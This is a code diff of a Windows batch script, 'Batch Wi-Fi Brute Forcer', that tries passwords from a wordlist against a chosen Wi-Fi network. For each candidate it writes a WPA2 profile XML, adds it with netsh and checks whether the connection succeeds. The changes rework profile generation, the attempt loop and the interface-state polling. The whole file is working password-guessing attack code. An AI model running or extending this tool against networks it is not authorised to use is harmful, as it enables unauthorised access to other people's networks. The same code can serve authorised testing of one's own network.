@@ -19,17 +19,10 @@ color 0f
 
 cd /D %~dp0
 
-if not exist "importwifi.xml" (
-    call :exit_fatal "importwifi.xml is missing. Exiting..."
+if exist "importwifi.xml" (
+    del importwifi.xml
 )
 
-if exist "importwifi_attempt.xml" (
-    del importwifi_attempt.xml
-)
-
-if exist "importwifi_prepared.xml" (
-    del importwifi_prepared.xml
-)
 
 :: Interface Variables
 set interface_number=0
@@ -46,7 +39,6 @@ if not exist "wordlist.txt" (
 ) else (
     set wordlist_file=wordlist.txt
 )
-
 
 :program_entry
     call :interface_init
@@ -324,11 +316,25 @@ goto :eof
     timeout /t 3 >nul
 goto :eof
 
-
 :mainmenu
     cls
     echo.
-    call :color_echo . cyan "Batch Wi-Fi Brute Forcer"
+	echo.
+	echo.                      ______________
+	echo                   ___/              \_
+	echo         \_       /       _  __________\       _/
+	echo           \     /         \/           \     /
+	echo                /     \     \            \
+	echo      \_       /  \    \     \______      \       _/
+	echo        \      \   \    \     \___//      /      /
+	echo                \__/\__/ \___/  __/      /
+	echo                 \             /        /
+	echo        \_        \                    /        _/
+	echo          \        \                  /        /
+	echo                    \________________/
+	echo.
+    echo.
+    call :color_echo . cyan "Batch Wi-Fi Brute Forcer - By TechnicalUserX"
     echo.
     echo.
     call :color_echo . magenta "Interface : "
@@ -351,38 +357,38 @@ goto :eof
     call :program_prompt
     echo.
 
-    if "!program_prompt_input!" equ "scan" (
+    if "%program_prompt_input%" equ "scan" (
         call :scan
         goto :mainmenu
     )
 
-    if "!program_prompt_input!" equ "interface" (
+    if "%program_prompt_input%" equ "interface" (
         call :interface_init
         goto :mainmenu
     )
 
-    if "!program_prompt_input!" equ "attack" (
+    if "%program_prompt_input%" equ "attack" (
         call :attack
         goto :mainmenu
     )
 
-    if "!program_prompt_input!" equ "help" (
+    if "%program_prompt_input%" equ "help" (
         call :help
         goto :mainmenu
     )
 
 
-    if "!program_prompt_input!" equ "wordlist" (
+    if "%program_prompt_input%" equ "wordlist" (
         call :wordlist
         goto :mainmenu
     )
 
-    if "!program_prompt_input!" equ "counter" (
+    if "%program_prompt_input%" equ "counter" (
         call :counter
         goto :mainmenu
     )
 
-    if "!program_prompt_input!" equ "exit" (
+    if "%program_prompt_input%" equ "exit" (
         exit
     )
 
@@ -392,7 +398,6 @@ goto :mainmenu
 
 :scan
     cls
-    netsh wlan disconnect interface="%interface_id%" > nul
 
     if "!interface_id!" equ "not_defined" (
         call :color_echo . red "You have to select an interface to perform a scan"
@@ -402,6 +407,16 @@ goto :mainmenu
         pause
         goto :eof
     )
+
+    netsh wlan disconnect interface="!interface_id!" > nul
+
+    :scan_wait_disconnected_loop
+    call :interface_find_state
+
+    if "%interface_state%" neq "disconnected" (
+        goto :scan_wait_disconnected_loop
+    )
+    
 
     echo.
     call :color_echo . cyan "Possible Wi-Fi Networks"
@@ -419,13 +434,12 @@ goto :mainmenu
     set scan_parse_arg=
 
     for /f "skip=3 tokens=* delims=" %%a in ('netsh wlan show networks mode^=bssid interface^="%interface_id%" ^| findstr /n "^"') do (
-        
         set "scan_parse_line=%%a"
         set "scan_parse_line=!scan_parse_line:*:=!"
 
-        if "!scan_parse_begin!" equ "true" if "scan_parse_line" neq "" (
+        if "!scan_parse_begin!" equ "true" if "!scan_parse_line!" neq "" (
+            for /f "tokens=1,* delims=:" %%x in ("!scan_parse_line!") do set scan_parse_arg=%%y
 
-            for /f "tokens=1,* delims=:" %%x in ('echo !scan_parse_line!') do set scan_parse_arg=%%y
             call :trim_spaces scan_parse_arg
 
             if "!scan_parse_counter!" equ "0" (
@@ -540,13 +554,6 @@ goto :eof
     netsh wlan delete profile name="!wifi_target!" interface="!interface_id!">nul
     cls
 
-    :: Prepare ssid import
-    del /Q /F importwifi_prepared.xml 2>nul
-    for /f "tokens=*" %%a in ( importwifi.xml ) do (
-        set variable=%%a
-        echo !variable:changethistitle=%wifi_target%!>>importwifi_prepared.xml
-    )
-
     set password_count=0
     
     for /f "tokens=1" %%a in ( !wordlist_file! ) do (
@@ -554,8 +561,13 @@ goto :eof
         set /a password_count=!password_count!+1
         set password=%%a
 		set temp_auth_num=0
-        call :prepare_attempt "!password!"
-        netsh wlan add profile filename="importwifi_attempt.xml" interface="!interface_id!" >nul
+        :: Prepare ssid import
+        del /Q /F importwifi.xml 2>nul
+        call :importwifi_write
+        netsh wlan add profile filename="importwifi.xml" interface="!interface_id!" >nul
+        if %errorlevel% neq 0 (
+            call :exit_fatal "Cannot add profile"
+        )
         cls
         echo.
         call :color_echo . cyan "Attacking"
@@ -588,9 +600,56 @@ goto :eof
 goto :eof
 
 
+:importwifi_write
+
+    set wifi_target_xml=!wifi_target!
+    set wifi_target_xml=!wifi_target_xml:^&=^&amp;!
+    set wifi_target_xml=!wifi_target_xml:^<=^&lt;!
+    set wifi_target_xml=!wifi_target_xml:^>=^&gt;!
+    set wifi_target_xml=!wifi_target_xml:^"=^&quot;!
+    set wifi_target_xml=!wifi_target_xml:^'=^&apos;!
+
+    set password_xml=!password!
+    set password_xml=!password_xml:^&=^&amp;!
+    set password_xml=!password_xml:^<=^&lt;!
+    set password_xml=!password_xml:^>=^&gt;!
+    set password_xml=!password_xml:^"=^&quot;!
+    set password_xml=!password_xml:^'=^&apos;!
+
+
+    echo ^<?xml version="1.0"?^> >> importwifi.xml
+    echo ^<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1"^> >> importwifi.xml
+    echo    ^<name^>!wifi_target_xml!^</name^> >> importwifi.xml
+    echo    ^<SSIDConfig^> >> importwifi.xml
+    echo        ^<SSID^> >> importwifi.xml
+    echo            ^<name^>!wifi_target_xml!^</name^> >> importwifi.xml
+    echo        ^</SSID^> >> importwifi.xml
+    echo    ^</SSIDConfig^> >> importwifi.xml
+    echo    ^<connectionType^>ESS^</connectionType^> >> importwifi.xml
+    echo    ^<connectionMode^>manual^</connectionMode^> >> importwifi.xml
+    echo    ^<MSM^> >> importwifi.xml
+    echo        ^<security^> >> importwifi.xml
+    echo            ^<authEncryption^> >> importwifi.xml
+    echo                ^<authentication^>WPA2PSK^</authentication^> >> importwifi.xml
+    echo                ^<encryption^>AES^</encryption^> >> importwifi.xml
+    echo                ^<useOneX^>false^</useOneX^> >> importwifi.xml
+    echo            ^</authEncryption^> >> importwifi.xml
+    echo            ^<sharedKey^> >> importwifi.xml
+    echo                ^<keyType^>passPhrase^</keyType^> >> importwifi.xml
+    echo                ^<protected^>false^</protected^> >> importwifi.xml
+    echo                ^<keyMaterial^>!password_xml!^</keyMaterial^> >> importwifi.xml
+    echo            ^</sharedKey^> >> importwifi.xml
+    echo        ^</security^> >> importwifi.xml
+    echo    ^</MSM^> >> importwifi.xml
+    echo    ^<MacRandomization xmlns="http://www.microsoft.com/networking/WLAN/profile/v3"^> >> importwifi.xml
+    echo        ^<enableRandomization^>false^</enableRandomization^> >> importwifi.xml
+    echo    ^</MacRandomization^> >> importwifi.xml
+    echo ^</WLANProfile^> >> importwifi.xml
+
+goto :eof
+
 :attack_failure
-    del /Q /F importwifi_prepared.xml 2>nul
-    del /Q /F importwifi_attempt.xml 2>nul
+    del /Q /F importwifi.xml 2>nul
     cls
     echo.
     call :color_echo . red "Could not find the password"
@@ -601,8 +660,7 @@ goto :eof
 goto :eof
 
 :attack_success
-    del /Q /F importwifi_prepared.xml 2>nul
-    del /Q /F importwifi_attempt.xml 2>nul
+    del /Q /F importwifi.xml 2>nul
     cls
     echo.
     call :color_echo . green "Found the password"
@@ -629,20 +687,20 @@ goto :eof
 goto :eof
 
 :attack_attempt
-	netsh wlan connect name="!wifi_target!" interface="!interface_id!" >nul
+	netsh wlan connect name="%wifi_target%" interface="%interface_id%" >nul
 
     if "%attack_counter_option%" equ "0" (
-        set attack_counter=9
+        set attack_counter=5
     ) else (
         set attack_counter=!attack_counter_option!
     )
 
     set attack_authenticating_detected=false
 
-    for /l %%a in ( 1, 1, 40 ) do (
+    :attack_attempt_loop
 
         if "!attack_counter!" equ "0" (
-            del /Q /F importwifi_attempt.xml 2>nul
+            del /Q /F importwifi.xml 2>nul
             goto :eof
         )
 
@@ -650,14 +708,16 @@ goto :eof
         call :color_echo . magenta "!attack_counter!"
         call :color_echo . white ") "
 
+        timeout /t 1 /nobreak >nul
+        set interface_state=none
         call :interface_find_state
 
         if "!interface_state!"=="disconnecting" (
-            call :color_echo . red "Trying..."
+            call :color_echo . red "Timeout"
             echo.
         )
         if "!interface_state!"=="disconnected" (
-            call :color_echo . red "Trying..."
+            call :color_echo . red "Timeout"
             echo.
         )
         if "!interface_state!"=="authenticating" (
@@ -682,21 +742,27 @@ goto :eof
         ) 
 
         if "!interface_state!" equ "connecting" (
-            del /Q /F importwifi_attempt.xml 2>nul
+            del /Q /F importwifi.xml 2>nul
             set attack_finalize=true
             call :attack_success
             goto :eof
         )
 
         if "!interface_state!" equ "connected" (
-            del /Q /F importwifi_attempt.xml 2>nul
+            del /Q /F importwifi.xml 2>nul
             set attack_finalize=true
             call :attack_success
             goto :eof
         )
         
+
+        if "!interface_state!" equ "none" (
+            call :exit_fatal "Cannot find interface state!"
+        )
+
         set /a attack_counter=!attack_counter!-1
-    )
+
+    goto :attack_attempt_loop
 
 goto :eof
 
@@ -769,18 +835,9 @@ goto :eof
     )
 goto :eof
 
-
-:prepare_attempt
-	for /f "tokens=*" %%x in ( importwifi_prepared.xml ) do (
-		set code=%%x
-		echo !code:changethiskey=%~1!>>importwifi_attempt.xml
-    )
-goto :eof
-
-
 :interface_find_state
 
-    for /f "tokens=2 delims==" %%A in ('wmic path WIN32_NetworkAdapter where "NetConnectionID='%interface_id%'" get NetConnectionStatus /value') do (
+    for /f "tokens=2 delims==" %%A in ('wmic path WIN32_NetworkAdapter where "NetConnectionID='!interface_id!'" get NetConnectionStatus /value') do (
         set interface_status_code=%%A
     )
 
@@ -804,8 +861,6 @@ goto :eof
         set interface_state=authenticating
     )
 
-
-
 goto :eof
 
 
@@ -814,6 +869,7 @@ goto :eof
     timeout /t 3 >nul
     exit
 goto :eof
+
 
 :trim_right
         set "str=!%~1!"
@@ -825,15 +881,17 @@ goto :eof
         set %~1=!str!
 goto :eof
 
+
 :trim_left
-set "str=!%~1!"
-:trim_left_loop
-if "!str:~0,1!"==" " (
-    set "str=!str:~1!"
-    goto trim_left_loop
-)
-set %~1=!str!
+    set "str=!%~1!"
+    :trim_left_loop
+    if "!str:~0,1!"==" " (
+        set "str=!str:~1!"
+        goto trim_left_loop
+    )
+    set %~1=!str!
 goto :eof
+
 
 :trim_spaces
         call :trim_left %1
